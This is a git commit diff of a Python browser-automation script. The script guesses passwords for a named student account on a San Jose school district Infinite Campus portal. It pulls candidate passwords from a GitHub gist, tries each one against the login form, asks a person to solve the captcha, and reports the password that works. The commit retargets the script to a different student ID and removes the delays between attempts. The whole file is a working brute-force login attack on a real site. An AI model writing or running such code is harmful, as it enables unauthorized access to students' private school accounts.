f7bfed837fe6c4cc04d8958ed56e92780ecb896b
DominusCube <70001673+DominusCube@users.noreply.github.com>
2022-02-24 03:44:55 +0000

    e

--- main.py
+++ main.py
@@ -5,42 +5,39 @@ import time
 web = Browser()
 web.go_to("https://sanjoseca.infinitecampus.org/campus/portal/students/sanjose.jsp")
 loggedIn = False
-gistApiLink = "https://api.github.com/gists/fafe299a9c8ef6d3ca2dd3fd22e0b64e"
+gistApiLink = "https://api.github.com/gists/79c6ffd3e861e6af983ff58e71f31980"
 passList = functions.readGist(gistApiLink)
 captcha = "not found"
 
 while loggedIn == False:
   
   for password in passList:
+    web.scrolly(200)
     print(password)
     if web.get_current_url().find("captcha") != -1 and captcha == "not found":
         print("Captcha detected!")
         captcha = input("Enter the captcha here: ")
     web.click(id="username")
-    web.type("s208614")
-    time.sleep(1)
+    web.type("s213613")
+    #time.sleep(1)
     web.click(id="password")
     web.type(password)
-    time.sleep(1)
+    #time.sleep(1)
     if captcha == "not found":
       web.press(web.Key.ENTER)
     else:
-      time.sleep(1)
-      web.click(id="cinput")
-      web.click(id="cinput")
-      web.click(id="cinput")
-      web.click(id="cinput")
+      #time.sleep(1)
       web.click(id="cinput")
       web.type(captcha)
-      time.sleep(1)
+      #time.sleep(1)
       web.press(web.Key.ENTER)
       
     
     if web.get_current_url() == "https://sanjoseca.infinitecampus.org/campus/nav-wrapper/student/portal/student/today":
-      print("Login succesful!")
+      print("Login successful!")
       correctPassword = password
       print(f"Logged in! Password is {password}")
-      loggedIn == True
+      loggedIn = True
       break
       
     
